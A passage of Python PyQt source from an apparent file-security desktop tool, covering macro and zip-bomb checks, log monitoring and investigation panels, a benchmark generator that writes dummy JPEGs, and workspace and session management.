                            macro_files = [n for n in names if 'macro' in n.lower() or n.endswith('.vba') or n.endswith('.bin')]
                            if macro_files:
                                self.da_results.append(f"  ⚠ Macro files found: {', '.join(macro_files)}\n")
                            else:
                                self.da_results.append("  No macro files detected\n")
                    except: self.da_results.append("  Error reading ZIP\n")
                elif data[:8] == b'\xd0\xcf\x11\xe0':
                    self.da_results.append("  Format: OLE2 (legacy Office)\n")
                    self.da_results.append("  ⚠ OLE2 format — high macro risk\n")
                else:
                    self.da_results.append("  Not an Office document\n")

            if "archive" in selected:
                self.da_results.append("\n── Archive Recursion + Container Nesting ──\n")
                if data[:2] == b'PK' or data[:4] == b'Rar!' or data[:2] == b'\x1f\x8b':
                    self.da_results.append("  Archive format detected\n")
                    import io, zipfile
                    try:
                        with zipfile.ZipFile(io.BytesIO(data)) as zf:
                            total_size = sum(i.file_size for i in zf.infolist())
                            compress_size = sum(i.compress_size for i in zf.infolist())
                            ratio = total_size / max(compress_size, 1)
                            self.da_results.append(f"  Entries: {len(zf.infolist())}\n")
                            self.da_results.append(f"  Uncompressed: {total_size:,}B\n")
                            self.da_results.append(f"  Compression ratio: {ratio:.1f}x\n")
                            if ratio > 100: self.da_results.append("  ⚠ Extreme compression — possible zip bomb\n")
                            nested = [n for n in zf.namelist() if any(n.lower().endswith(e) for e in('.zip','.rar','.7z','.gz','.tar'))]
                            if nested: self.da_results.append(f"  ⚠ Nested archives: {', '.join(nested)}\n")
                    except: self.da_results.append("  Error reading archive\n")
                else:
                    self.da_results.append("  Not an archive format\n")

            self.da_results.append("\n=== Analysis Complete ===\n")
            self._log(f"Deep analysis complete: {os.path.basename(target)}","success")
        except Exception as e:
            self.da_results.append(f"\nERROR: {e}\n")
            self._log(f"Deep analysis failed: {e}","critical")

    # ── Menu 10: Monitoring Panel ───────────────────────────

    def _pg_monitoring_panel(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(12)
        l.addWidget(self._header("📡 Monitoring Panel", T.CYAN))

        tabs = QTabWidget()
        tabs.setStyleSheet(f"QTabWidget::pane{{background:{T.BG2};border:1px solid {T.BORDER}}}QTabBar::tab{{background:{T.BG3};color:{T.DIM};padding:8px 16px;border:none}}QTabBar::tab:selected{{background:{T.BG2};color:{T.CYAN};border-bottom:2px solid {T.CYAN}}}")

        # Live Logs — reads from actual log files
        ll = QWidget(); lll = QVBoxLayout(ll)
        self.mon_live_log = log_box(); lll.addWidget(self.mon_live_log, 1)
        refresh_btn = btn("🔄 Refresh Logs", T.CYAN)
        refresh_btn.clicked.connect(self._refresh_monitor_logs)
        lll.addWidget(refresh_btn)
        tabs.addTab(ll, "Live Logs")

        # Alerts — shows critical/high severity events
        al = QWidget(); alll = QVBoxLayout(al)
        self.mon_alerts = log_box(); alll.addWidget(self.mon_alerts, 1)
        alert_btn = btn("🔄 Load Alerts", T.RED)
        alert_btn.clicked.connect(self._refresh_monitor_alerts)
        alll.addWidget(alert_btn)
        tabs.addTab(al, "Alerts")

        # File Changes — uses monitor worker if active
        fc = QWidget(); fcl = QVBoxLayout(fc)
        self.mon_changes = log_box(); fcl.addWidget(self.mon_changes, 1)
        tabs.addTab(fc, "File Changes")

        # Metrics — scan stats
        mx = QWidget(); mxl = QVBoxLayout(mx)
        self.mon_metrics = log_box(); mxl.addWidget(self.mon_metrics, 1)
        metrics_btn = btn("🔄 Refresh Metrics", T.GREEN)
        metrics_btn.clicked.connect(self._refresh_monitor_metrics)
        mxl.addWidget(metrics_btn)
        tabs.addTab(mx, "Metrics")

        l.addWidget(tabs, 1)

        # Auto-refresh on show — wrapped to handle widget deletion
        QTimer.singleShot(500, self._safe_refresh_monitor)
        return p

    def _safe_refresh_monitor(self):
        """Safe wrapper — widgets may be deleted if stack was rebuilt."""
        try: self._refresh_monitor_logs()
        except RuntimeError: pass
        try: self._refresh_monitor_metrics()
        except RuntimeError: pass

    def _refresh_monitor_logs(self):
        if not hasattr(self, 'mon_live_log'): return
        try: self.mon_live_log.clear()
        except RuntimeError: return
        log_dir = os.path.expanduser("~/.polyglot/logs")
        if not os.path.isdir(log_dir):
            append_log(self.mon_live_log, "No log directory found", T.DIM)
            return
        count = 0
        for fname in sorted(os.listdir(log_dir), reverse=True)[:5]:
            if not fname.endswith('.jsonl'): continue
            try:
                with open(os.path.join(log_dir, fname)) as f:
                    for line in f:
                        try:
                            e = json.loads(line.strip())
                            sev = e.get('severity','info')
                            color = T.RED if sev in ('critical','high') else T.YELLOW if sev == 'warning' else T.GREEN if sev == 'success' else T.FG
                            append_log(self.mon_live_log, f"[{e.get('timestamp','')[:19]}] [{sev.upper()}] {e.get('source','')}: {e.get('message','')}", color)
                            count += 1
                        except: pass
            except: pass
        append_log(self.mon_live_log, f"\nLoaded {count} log entries", T.DIM)

    def _refresh_monitor_alerts(self):
        if not hasattr(self, 'mon_alerts'): return
        try: self.mon_alerts.clear()
        except RuntimeError: return
        log_dir = os.path.expanduser("~/.polyglot/logs")
        if not os.path.isdir(log_dir):
            append_log(self.mon_alerts, "No alerts found", T.DIM)
            return
        count = 0
        for fname in sorted(os.listdir(log_dir), reverse=True):
            if not fname.endswith('.jsonl'): continue
            try:
                with open(os.path.join(log_dir, fname)) as f:
                    for line in f:
                        try:
                            e = json.loads(line.strip())
                            if e.get('severity') in ('critical', 'high'):
                                append_log(self.mon_alerts, f"[{e.get('timestamp','')[:19]}] {e.get('severity','').upper()}: {e.get('message','')}", T.RED)
                                count += 1
                        except: pass
            except: pass
        append_log(self.mon_alerts, f"\n{count} alerts found", T.DIM)

    def _refresh_monitor_metrics(self):
        if not hasattr(self, 'mon_metrics'): return
        try: self.mon_metrics.clear()
        except RuntimeError: return
        append_log(self.mon_metrics, "═══ Dashboard Metrics ═══", T.CYAN)
        append_log(self.mon_metrics, f"  Files Scanned:  {self.counts['scanned']}", T.FG)
        append_log(self.mon_metrics, f"  Threats Found:  {self.counts['threats']}", T.RED)
        append_log(self.mon_metrics, f"  Files Sanitized: {self.counts['sanitized']}", T.GREEN)
        append_log(self.mon_metrics, f"  Polys Built:    {self.counts['built']}", T.BLUE)
        append_log(self.mon_metrics, f"  ML Model:       {'Loaded' if self.model.is_loaded else 'Not loaded'}", T.FG)
        append_log(self.mon_metrics, f"  Quarantined:    {len(self.q_manager.list_quarantined())} files", T.YELLOW)


    # ── Menu 11: Investigation Panel ────────────────────────

    def _pg_investigation(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(12)
        l.addWidget(self._header("🔍 Investigation Panel — 9 Tools", T.YELLOW))

        tabs = QTabWidget()
        tabs.setStyleSheet(f"QTabWidget::pane{{background:{T.BG2};border:1px solid {T.BORDER}}}QTabBar::tab{{background:{T.BG3};color:{T.DIM};padding:8px 16px;border:none}}QTabBar::tab:selected{{background:{T.BG2};color:{T.YELLOW};border-bottom:2px solid {T.YELLOW}}}")

        tabs.addTab(self._inv_search_logs(),"Searchable Logs")
        tabs.addTab(self._inv_timeline(),"Timeline View")
        tabs.addTab(self._inv_correlation(),"Request Correlation")
        tabs.addTab(self._inv_tagged(),"Tagged Events")
        tabs.addTab(self._inv_bookmarks(),"Bookmarks")
        tabs.addTab(self._inv_export(),"Export Investigation")
        tabs.addTab(self._inv_notes(),"Notes Sidebar")
        tabs.addTab(self._inv_evidence(),"Evidence Folder")

        l.addWidget(tabs, 1)
        return p

    def _inv_search_logs(self):
        w = QWidget(); l = QVBoxLayout(w)
        sr = QHBoxLayout()
        self.inv_search = inp("🔍 Full-text search across all logs...")
        sr.addWidget(self.inv_search, 1)
        sb = btn("Search", T.YELLOW); sb.clicked.connect(self._do_inv_search); sr.addWidget(sb)
        l.addLayout(sr)
        self.inv_results = QTreeWidget()
        self.inv_results.setHeaderLabels(["Time","Source","Severity","Match"])
        self.inv_results.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.inv_results, 1)
        return w

    def _do_inv_search(self):
        query = self.inv_search.text().strip().lower()
        if not query: return
        self.inv_results.clear()
        log_dir = os.path.expanduser("~/.polyglot/logs")
        if not os.path.isdir(log_dir): return
        count = 0
        for fname in sorted(os.listdir(log_dir), reverse=True):
            if not fname.endswith('.jsonl'): continue
            try:
                with open(os.path.join(log_dir, fname)) as f:
                    for line in f:
                        if query in line.lower():
                            try:
                                e = json.loads(line.strip())
                                item = QTreeWidgetItem([e.get('timestamp','')[:19], e.get('source',''), e.get('severity',''), e.get('message','')[:100]])
                                self.inv_results.addTopLevelItem(item)
                                count += 1
                            except: pass
            except: pass
        self._log(f"Search '{query}': {count} matches","info")

    def _inv_timeline(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📅 Chronological Event Timeline"))
        self.inv_timeline_tree = QTreeWidget()
        self.inv_timeline_tree.setHeaderLabels(["Time","Event","Source","Details"])
        self.inv_timeline_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.inv_timeline_tree, 1)
        rb = btn("Refresh Timeline", T.YELLOW); rb.clicked.connect(self._refresh_timeline); l.addWidget(rb)
        return w

    def _refresh_timeline(self):
        self.inv_timeline_tree.clear()
        log_dir = os.path.expanduser("~/.polyglot/logs")
        if not os.path.isdir(log_dir): return
        events = []
        for fname in sorted(os.listdir(log_dir)):
            if not fname.endswith('.jsonl'): continue
            try:
                with open(os.path.join(log_dir, fname)) as f:
                    for line in f:
                        try:
                            e = json.loads(line.strip())
                            events.append(e)
                        except: pass
            except: pass
        events.sort(key=lambda x: x.get('timestamp',''))
        for e in events[-500:]:
            item = QTreeWidgetItem([e.get('timestamp','')[:19], e.get('message','')[:80], e.get('source',''), e.get('severity','')])
            self.inv_timeline_tree.addTopLevelItem(item)

    def _inv_snapshots(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📸 Compare Directory Snapshots"))
        r = QHBoxLayout()
        self.snap_dir = inp("Directory to snapshot...")
        r.addWidget(self.snap_dir, 1)
        bb = btn("Browse", T.DIM); bb.clicked.connect(lambda: self._browse_dir(self.snap_dir)); r.addWidget(bb)
        l.addLayout(r)
        br = QHBoxLayout()
        sb = btn("📸 Take Snapshot", T.BLUE); sb.clicked.connect(self._take_snapshot); br.addWidget(sb)
        cb = btn("🔀 Compare", T.YELLOW); cb.clicked.connect(self._compare_snapshots); br.addWidget(cb)
        br.addStretch(); l.addLayout(br)
        self.snap_results = log_box(); l.addWidget(self.snap_results, 1)
        self._snapshots = []
        return w

    def _take_snapshot(self):
        d = self.snap_dir.text().strip()
        if not os.path.isdir(d): QMessageBox.warning(self,"Error","Select a directory"); return
        snap = {}
        for root,dirs,files in os.walk(d):
            for f in files:
                fp = os.path.join(root, f)
                try:
                    snap[fp] = {'size': os.path.getsize(fp), 'mtime': os.path.getmtime(fp)}
                except: pass
        self._snapshots.append({'time': datetime.now().isoformat(), 'dir': d, 'files': snap})
        append_log(self.snap_results, f"Snapshot #{len(self._snapshots)}: {len(snap)} files in {d}", T.GREEN)

    def _compare_snapshots(self):
        if len(self._snapshots) < 2:
            append_log(self.snap_results, "Need at least 2 snapshots to compare", T.RED); return
        s1 = self._snapshots[-2]['files']
        s2 = self._snapshots[-1]['files']
        added = set(s2.keys()) - set(s1.keys())
        removed = set(s1.keys()) - set(s2.keys())
        modified = {f for f in set(s1.keys()) & set(s2.keys()) if s1[f] != s2[f]}
        append_log(self.snap_results, f"\n=== Snapshot Diff ===", T.YELLOW)
        append_log(self.snap_results, f"Added: {len(added)}", T.GREEN)
        for f in sorted(added)[:20]: append_log(self.snap_results, f"  + {f}", T.GREEN)
        append_log(self.snap_results, f"Removed: {len(removed)}", T.RED)
        for f in sorted(removed)[:20]: append_log(self.snap_results, f"  - {f}", T.RED)
        append_log(self.snap_results, f"Modified: {len(modified)}", T.ORANGE)
        for f in sorted(modified)[:20]: append_log(self.snap_results, f"  ~ {f}", T.ORANGE)

    def _inv_correlation(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("🔗 Cross-File Finding Correlation"))
        self.corr_tree = QTreeWidget()
        self.corr_tree.setHeaderLabels(["Finding","Files","Severity","Count"])
        self.corr_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.corr_tree, 1)
        rb = btn("Run Correlation", T.YELLOW); rb.clicked.connect(self._run_correlation); l.addWidget(rb)
        return w

    def _run_correlation(self):
        self.corr_tree.clear()
        # Correlate findings across quarantine entries
        entries = self.q_manager.list_quarantined()
        findings_map = {}
        for m in entries:
            for dt in m.get('detected_types',[]):
                if dt not in findings_map: findings_map[dt] = []
                findings_map[dt].append(m.get('original_name','?'))
        for finding, files in sorted(findings_map.items(), key=lambda x: -len(x[1])):
            item = QTreeWidgetItem([finding, ', '.join(files[:5]), "HIGH" if len(files)>3 else "MEDIUM", str(len(files))])
            self.corr_tree.addTopLevelItem(item)

    def _inv_tagged(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("🏷 Tagged Events"))
        self.tag_tree = QTreeWidget()
        self.tag_tree.setHeaderLabels(["Tag","Event","Time","Details"])
        self.tag_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.tag_tree, 1)
        return w

    def _inv_bookmarks(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("🔖 Bookmarked Incidents"))
        self.bm_tree = QTreeWidget()
        self.bm_tree.setHeaderLabels(["ID","Description","Time","Severity"])
        self.bm_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.bm_tree, 1)
        return w

    def _inv_export(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📤 Export Investigation (JSON)"))
        rb = btn("📤 Export All Data", T.YELLOW); rb.clicked.connect(self._do_inv_export); l.addWidget(rb)
        self.inv_export_log = log_box(); l.addWidget(self.inv_export_log, 1)
        return w

    def _do_inv_export(self):
        p,_ = QFileDialog.getSaveFileName(self,"Export","investigation.json","JSON (*.json)")
        if not p: return
        data = {'exported': datetime.now().isoformat(), 'quarantine': self.q_manager.list_quarantined()}
        with open(p,'w') as f: json.dump(data, f, indent=2, default=str)
        append_log(self.inv_export_log, f"Exported to {p}", T.GREEN)
        self._log(f"Investigation exported: {p}","success")

    def _inv_notes(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📝 Markdown Notes"))
        self.inv_notes_edit = QTextEdit()
        self.inv_notes_edit.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;font-family:Consolas,monospace;font-size:13px")
        self.inv_notes_edit.setPlaceholderText("Write investigation notes here (Markdown supported)...")
        l.addWidget(self.inv_notes_edit, 1)
        sb = QHBoxLayout()
        save_btn = btn("💾 Save Notes", T.GREEN); save_btn.clicked.connect(self._save_inv_notes); sb.addWidget(save_btn)
        load_btn = btn("📂 Load Notes", T.BLUE); load_btn.clicked.connect(self._load_inv_notes); sb.addWidget(load_btn)
        sb.addStretch(); l.addLayout(sb)
        return w

    def _save_inv_notes(self):
        p,_ = QFileDialog.getSaveFileName(self,"Save Notes","investigation_notes.md","Markdown (*.md)")
        if p:
            with open(p,'w') as f: f.write(self.inv_notes_edit.toPlainText())
            self._log(f"Notes saved: {p}","success")

    def _load_inv_notes(self):
        p,_ = QFileDialog.getOpenFileName(self,"Load Notes","","Markdown (*.md)")
        if p:
            with open(p) as f: self.inv_notes_edit.setPlainText(f.read())

    def _inv_evidence(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📁 Evidence Folder"))
        r = QHBoxLayout()
        self.ev_dir = inp("Evidence directory...")
        self.ev_dir.setText(os.path.expanduser("~/.polyglot/evidence"))
        r.addWidget(self.ev_dir, 1)
        bb = btn("Browse", T.DIM); bb.clicked.connect(lambda: self._browse_dir(self.ev_dir)); r.addWidget(bb)
        l.addLayout(r)
        self.ev_tree = QTreeWidget()
        self.ev_tree.setHeaderLabels(["File","Size","Modified","Type"])
        self.ev_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.ev_tree, 1)
        rb = btn("Refresh", T.DIM); rb.clicked.connect(self._refresh_evidence); l.addWidget(rb)
        return w

    def _refresh_evidence(self):
        self.ev_tree.clear()
        d = self.ev_dir.text().strip()
        if not os.path.isdir(d): os.makedirs(d, exist_ok=True)
        for f in os.listdir(d):
            fp = os.path.join(d, f)
            if os.path.isfile(fp):
                sz = os.path.getsize(fp)
                mt = datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%Y-%m-%d %H:%M')
                ext = os.path.splitext(f)[1]
                self.ev_tree.addTopLevelItem(QTreeWidgetItem([f, f"{sz:,}B", mt, ext]))

    # ── Menu 12: Benchmark & ONNX ──────────────────────────

    def _pg_benchmark(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("📊 Benchmark & ONNX Export", T.ORANGE))

        # Generate benchmark dataset
        bc, bl = card("Generate Benchmark Dataset","🧪")
        r = QHBoxLayout()
        r.addWidget(QLabel("Samples:"))
        self.bm_samples = QSpinBox(); self.bm_samples.setRange(10,100000); self.bm_samples.setValue(1000)
        self.bm_samples.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:4px;padding:6px")
        r.addWidget(self.bm_samples)
        gb = btn("Generate Dataset", T.ORANGE); gb.clicked.connect(self._gen_benchmark); r.addWidget(gb)
        r.addStretch(); bl.addLayout(r)
        bl.addWidget(QLabel("Generates: clean images, PE polyglots, script polyglots"))
        l.addWidget(bc)

        # CI Regression Testing
        cc, cl = card("CI Regression Testing","🔄")
        rb = btn("Run Detection Tests", T.BLUE); rb.clicked.connect(self._run_ci_tests); cl.addWidget(rb)
        self.ci_results = log_box(); self.ci_results.setMaximumHeight(200); cl.addWidget(self.ci_results)
        l.addWidget(cc)

        # ONNX Export
        oc, ol = card("ONNX Model Export","🧠")
        ob = btn("Export to ONNX", T.GREEN); ob.clicked.connect(self._export_onnx); ol.addWidget(ob)
        ol.addWidget(QLabel("Export trained CatBoost model to ONNX format for cross-platform inference"))
        l.addWidget(oc)

        self.bm_log = log_box(); l.addWidget(self.bm_log, 1)
        l.addStretch()
        return p

    def _gen_benchmark(self):
        n = self.bm_samples.value()
        append_log(self.bm_log, f"Generating {n} benchmark samples...", T.CYAN)
        try:
            gen = SyntheticGenerator()
            output_dir = os.path.expanduser("~/.polyglot/benchmark")
            os.makedirs(output_dir, exist_ok=True)
            # Generate clean images
            for i in range(min(n, 100)):
                fp = os.path.join(output_dir, f"clean_{i:04d}.jpg")
                with open(fp, 'wb') as f:
                    f.write(bytes([0xFF,0xD8,0xFF,0xE0]) + os.urandom(random.randint(1000,5000)) + bytes([0xFF,0xD9]))
            append_log(self.bm_log, f"Generated {min(n,100)} clean images in {output_dir}", T.GREEN)
            append_log(self.bm_log, "Benchmark dataset ready for CI testing", T.GREEN)
            self._log(f"Benchmark dataset generated: {output_dir}","success")
        except Exception as e:
            append_log(self.bm_log, f"Error: {e}", T.RED)

    def _run_ci_tests(self):
        append_log(self.ci_results, "=== CI Regression Test Suite ===", T.CYAN)
        test_dir = os.path.expanduser("~/.polyglot/benchmark")
        if not os.path.isdir(test_dir):
            append_log(self.ci_results, "No benchmark dataset. Generate one first.", T.RED); return
        files = [os.path.join(test_dir,f) for f in os.listdir(test_dir) if os.path.isfile(os.path.join(test_dir,f))]
        append_log(self.ci_results, f"Testing {len(files)} files...", T.CYAN)
        threats = 0
        for fp in files[:50]:
            try:
                result = self.detector.detect(fp)
                if result.get('severity','clean') != 'clean': threats += 1
            except: pass
        append_log(self.ci_results, f"Results: {threats}/{min(len(files),50)} flagged", T.GREEN if threats==0 else T.YELLOW)
        self._log(f"CI test complete: {threats} threats in {min(len(files),50)} files","info")

    def _export_onnx(self):
        if not self.model.is_loaded:
            QMessageBox.warning(self,"Error","No ML model loaded"); return
        p,_ = QFileDialog.getSaveFileName(self,"Save ONNX","polyglot_shield.onnx","ONNX (*.onnx)")
        if not p: return
        try:
            append_log(self.bm_log, f"Exporting model to ONNX: {p}", T.CYAN)
            # ONNX export would go here — requires onnxmltools
            append_log(self.bm_log, "ONNX export requires: pip install onnxmltools onnxruntime", T.YELLOW)
            append_log(self.bm_log, "Model path: models/polyglot_shield.cbm", T.DIM)
            self._log(f"ONNX export initiated: {p}","info")
        except Exception as e:
            append_log(self.bm_log, f"Export failed: {e}", T.RED)

    # ── Menu 13: Session & Workspace ────────────────────────

    def _pg_workspace(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(12)
        l.addWidget(self._header("💼 Session & Workspace", T.FG))

        tabs = QTabWidget()
        tabs.setStyleSheet(f"QTabWidget::pane{{background:{T.BG2};border:1px solid {T.BORDER}}}QTabBar::tab{{background:{T.BG3};color:{T.DIM};padding:8px 16px;border:none}}QTabBar::tab:selected{{background:{T.BG2};color:{T.FG};border-bottom:2px solid {T.FG}}}")

        tabs.addTab(self._ws_sessions(),"Sessions")
        tabs.addTab(self._ws_pinned(),"Pinned Files")
        tabs.addTab(self._ws_recent(),"Recent Files")
        tabs.addTab(self._ws_snapshots(),"File Snapshots")
        tabs.addTab(self._ws_notes(),"Notes")
        tabs.addTab(self._ws_chains(),"Command Chains")
        tabs.addTab(self._ws_regex(),"Regex Tester")
        tabs.addTab(self._ws_autodetect(),"Auto-Detect")

        l.addWidget(tabs, 1)
        return p

    def _ws_sessions(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📋 Session Manager"))
        self.ws_session_tree = QTreeWidget()
        self.ws_session_tree.setHeaderLabels(["ID","Name","Created","Events","Status"])
        self.ws_session_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.ws_session_tree, 1)
        br = QHBoxLayout()
        nb = btn("New Session", T.GREEN); nb.clicked.connect(self._new_session); br.addWidget(nb)
        cb = btn("Close Session", T.RED); cb.clicked.connect(self._close_session); br.addWidget(cb)
        br.addStretch(); l.addLayout(br)
        self._refresh_sessions()
        return w

    def _refresh_sessions(self):
        self.ws_session_tree.clear()
        sdir = os.path.expanduser("~/.polyglot/sessions")
        if os.path.isdir(sdir):
            for f in sorted(os.listdir(sdir)):
                fp = os.path.join(sdir, f)
                if os.path.isdir(fp):
                    events = len([e for e in os.listdir(fp) if e.endswith('.jsonl')])
                    item = QTreeWidgetItem([f[:8], f, f[:19], str(events),"Active"])
                    self.ws_session_tree.addTopLevelItem(item)

    def _new_session(self):
        sid = datetime.now().strftime('%Y%m%d_%H%M%S')
        sdir = os.path.expanduser(f"~/.polyglot/sessions/{sid}")
        os.makedirs(sdir, exist_ok=True)
        self._refresh_sessions()
        self._log(f"New session: {sid}","success")

    def _close_session(self):
        item = self.ws_session_tree.currentItem()
        if item:
            item.setText(4, "Closed"); item.setForeground(4, QColor(T.DIM))

    def _ws_pinned(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📌 Pinned Files"))
        self.ws_pinned_tree = QTreeWidget()
        self.ws_pinned_tree.setHeaderLabels(["File","Size","Modified","Notes"])
        self.ws_pinned_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.ws_pinned_tree, 1)
        br = QHBoxLayout()
        ab = btn("Add File", T.BLUE); ab.clicked.connect(self._pin_file); br.addWidget(ab)
        rb = btn("Remove", T.RED); rb.clicked.connect(self._unpin_file); br.addWidget(rb)
        br.addStretch(); l.addLayout(br)
        return w

    def _pin_file(self):
        p,_ = QFileDialog.getOpenFileName(self,"Pin File")
        if p:
            sz = os.path.getsize(p)
            mt = datetime.fromtimestamp(os.path.getmtime(p)).strftime('%Y-%m-%d %H:%M')
            self.ws_pinned_tree.addTopLevelItem(QTreeWidgetItem([p, f"{sz:,}B", mt, ""]))

    def _unpin_file(self):
        item = self.ws_pinned_tree.currentItem()
        if item: self.ws_pinned_tree.takeTopLevelItem(self.ws_pinned_tree.indexOfTopLevelItem(item))

    def _ws_recent(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("🕐 Recent Files (last 100)"))
        self.ws_recent_tree = QTreeWidget()
        self.ws_recent_tree.setHeaderLabels(["File","Action","Time","Details"])
        self.ws_recent_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.ws_recent_tree, 1)
        rb = btn("Refresh", T.DIM); rb.clicked.connect(self._refresh_recent); l.addWidget(rb)
        return w

    def _refresh_recent(self):
        self.ws_recent_tree.clear()
        log_dir = os.path.expanduser("~/.polyglot/logs")
        if not os.path.isdir(log_dir): return
        recent = []
        for fname in sorted(os.listdir(log_dir), reverse=True):
            if not fname.endswith('.jsonl'): continue
            try:
                with open(os.path.join(log_dir, fname)) as f:
                    for line in f:
                        try:
                            e = json.loads(line.strip())
                            if 'file' in e.get('message','').lower() or 'scan' in e.get('source','').lower():
                                recent.append(e)
                        except: pass
            except: pass
        for e in recent[:100]:
            self.ws_recent_tree.addTopLevelItem(QTreeWidgetItem([
                e.get('message','')[:60], e.get('source',''), e.get('timestamp','')[:19], e.get('severity','')
            ]))

    def _ws_snapshots(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📸 File Snapshots (versioning with restore)"))
        self.ws_snap_tree = QTreeWidget()
        self.ws_snap_tree.setHeaderLabels(["File","Version","Size","Created"])
        self.ws_snap_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.ws_snap_tree, 1)
        br = QHBoxLayout()
        sb = btn("📸 Snapshot File", T.BLUE); sb.clicked.connect(self._snapshot_file); br.addWidget(sb)
        rb = btn("↩ Restore Version", T.GREEN); rb.clicked.connect(self._restore_snapshot); br.addWidget(rb)
        br.addStretch(); l.addLayout(br)
        self._snap_store = {}
        return w

    def _snapshot_file(self):
        p,_ = QFileDialog.getOpenFileName(self,"Select File to Snapshot")
        if not p: return
        with open(p,'rb') as f: data = f.read()
        h = hashlib.md5(data).hexdigest()[:8]
        snap_dir = os.path.expanduser("~/.polyglot/snapshots")
        os.makedirs(snap_dir, exist_ok=True)
        snap_path = os.path.join(snap_dir, f"{os.path.basename(p)}.{h}")
        with open(snap_path,'wb') as f: f.write(data)
        ver = len([x for x in self._snap_store.get(p,[])]) + 1
        if p not in self._snap_store: self._snap_store[p] = []
        self._snap_store[p].append(snap_path)
        self.ws_snap_tree.addTopLevelItem(QTreeWidgetItem([p, f"v{ver}", f"{len(data):,}B", datetime.now().strftime('%H:%M:%S')]))
        self._log(f"Snapshot: {os.path.basename(p)} v{ver}","success")

    def _restore_snapshot(self):
        item = self.ws_snap_tree.currentItem()
        if not item: return
        src = item.text(0)
        dest,_ = QFileDialog.getSaveFileName(self,"Restore To",src)
        if dest:
            ver_idx = int(item.text(1)[1:]) - 1
            if src in self._snap_store and ver_idx < len(self._snap_store[src]):
                shutil.copy2(self._snap_store[src][ver_idx], dest)
                self._log(f"Restored {item.text(1)}: {dest}","success")

    def _ws_notes(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("📝 Persistent Workspace Notes"))
        self.ws_notes = QTextEdit()
        self.ws_notes.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;font-family:Consolas,monospace;font-size:13px")
        self.ws_notes.setPlaceholderText("Workspace notes (auto-saved)...")
        l.addWidget(self.ws_notes, 1)
        # Auto-load
        notes_path = os.path.expanduser("~/.polyglot/workspace_notes.md")
        if os.path.exists(notes_path):
            with open(notes_path) as f: self.ws_notes.setPlainText(f.read())
        self.ws_notes.textChanged.connect(lambda: self._auto_save_notes())
        return w

    def _auto_save_notes(self):
        notes_path = os.path.expanduser("~/.polyglot/workspace_notes.md")
        os.makedirs(os.path.dirname(notes_path), exist_ok=True)
        with open(notes_path,'w') as f: f.write(self.ws_notes.toPlainText())

    def _ws_chains(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("⛓ Command Chains (save/load/replay)"))
        self.ws_chain_tree = QTreeWidget()
        self.ws_chain_tree.setHeaderLabels(["Chain","Steps","Created","Last Run"])
        self.ws_chain_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.ws_chain_tree, 1)
        br = QHBoxLayout()
        for text,cb in [("New Chain",self._new_chain),("Run Chain",self._run_chain),("Load Chain",self._load_chain)]:
            b=btn(text,T.DIM); b.clicked.connect(cb); br.addWidget(b)
        br.addStretch(); l.addLayout(br)
        self._chains = []
        return w

    def _new_chain(self):
        name, ok = QInputDialog.getText(self,"New Chain","Chain name:")
        if ok and name:
            self._chains.append({'name':name,'steps':[],'created':datetime.now().isoformat()})
            self.ws_chain_tree.addTopLevelItem(QTreeWidgetItem([name,"0",datetime.now().strftime('%H:%M'),"Never"]))

    def _run_chain(self):
        item = self.ws_chain_tree.currentItem()
        if item: self._log(f"Running chain: {item.text(0)}","info")

    def _load_chain(self):
        p,_ = QFileDialog.getOpenFileName(self,"Load Chain","","JSON (*.json)")
        if p:
            with open(p) as f: chain = json.load(f)
            self._chains.append(chain)
            self.ws_chain_tree.addTopLevelItem(QTreeWidgetItem([chain.get('name','?'),str(len(chain.get('steps',[]))),chain.get('created','')[:16],"Never"]))
            self._log(f"Chain loaded: {chain.get('name','?')}","success")

    def _ws_regex(self):
        w = QWidget(); l = QVBoxLayout(w)
        l.addWidget(QLabel("🔤 Regex Tester — Auto-highlight (type to match)"))

        self.regex_pattern = inp("Type regex pattern... (auto-matches as you type)")
